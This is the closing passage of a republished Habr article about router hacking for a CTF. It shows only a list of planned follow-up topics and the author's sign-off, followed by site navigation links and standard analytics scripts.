Adding backdoor to the firmware so that it is not removed when updating the firmware </li><li>  Paint the router remotely </li><li>  Reprogramming the LED on the game in PONG </li></ul><br>  There are a lot of things that I want to write about, but hold them for the next posts.  If you intend to participate in SOHOpelessly Broken CTF and found this article useful, you can kick me at any time and drink coffee with me during DEFCON / BsidesLV / Blackhat =) </div><p>Source: <a href="https://habr.com/ru/post/230469/">https://habr.com/ru/post/230469/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../230459/index.html">NES / Sega / etc emulation in your pocket: Browse / configure EXEQ Ray 2 (JXD S5110b) - firmware, software, management</a></li>
<li><a href="../230461/index.html">VolksPC - Android and Debian at the same time</a></li>
<li><a href="../230463/index.html">MakeItLab at the Innoprom 2014 exhibition</a></li>
<li><a href="../230465/index.html">The landing of a man on the moon turned 45 years old</a></li>
<li><a href="../230467/index.html">FSB and user data</a></li>
<li><a href="../230471/index.html">IPTV from MGTS: channel search</a></li>
<li><a href="../230473/index.html">Marlight: lamps for programmers</a></li>
<li><a href="../230477/index.html">WebCamp 2014 Live Webcast</a></li>
<li><a href="../230479/index.html">3 worst things you can do with Linq to Database</a></li>
<li><a href="../230481/index.html">The digest of interesting news and materials from the world of PHP No. 44 (July 1 - 20, 2014)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>